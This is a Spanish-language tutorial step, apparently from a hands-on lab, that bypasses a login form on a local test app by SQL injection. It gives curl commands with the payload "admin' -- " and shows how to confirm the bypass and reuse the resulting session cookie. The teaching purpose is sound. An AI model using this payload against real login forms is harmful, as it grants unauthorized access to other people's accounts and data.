# Paso 2 — Bypass manual con curl

## 2.1 — Confirmar el comportamiento normal

Un intento con una contraseña cualquiera falla y devuelve `200` (la página de login, con el error):

```bash
curl -s -o /dev/null -w "%{http_code}\n" \
  --data-urlencode "usuario=admin" \
  --data-urlencode "password=loquesea" \
  http://127.0.0.1:8888/login
```

## 2.2 — El payload

Usamos `--data-urlencode` para que `curl` codifique correctamente la comilla y el espacio del payload:

```bash
curl -s -c /tmp/cookies-sqli.txt -o /dev/null -w "%{http_code}\n" \
  --data-urlencode "usuario=admin' -- " \
  --data-urlencode "password=loquesea" \
  http://127.0.0.1:8888/login
```

Si ves `302` en vez de `200`, entraste. Un login exitoso redirige a `/`; uno fallido vuelve a mostrar el formulario con error.

## 2.3 — Confirmar el acceso

```bash
curl -s -b /tmp/cookies-sqli.txt -o /dev/null -w "%{http_code}\n" http://127.0.0.1:8888/
```

`200` sin redirect: la cookie de sesión que generó el bypass te deja entrar al CRUD igual que un login legítimo.

## 2.4 — Sin saber la contraseña

Fijate que en ningún momento usamos `admin123` (la contraseña real). El payload no adivinó la contraseña — hizo que la consulta dejara de comprobarla.

> En el Paso 3 vamos a probarlo desde el navegador y ver una variante que ni siquiera necesita saber que el usuario `admin` existe.
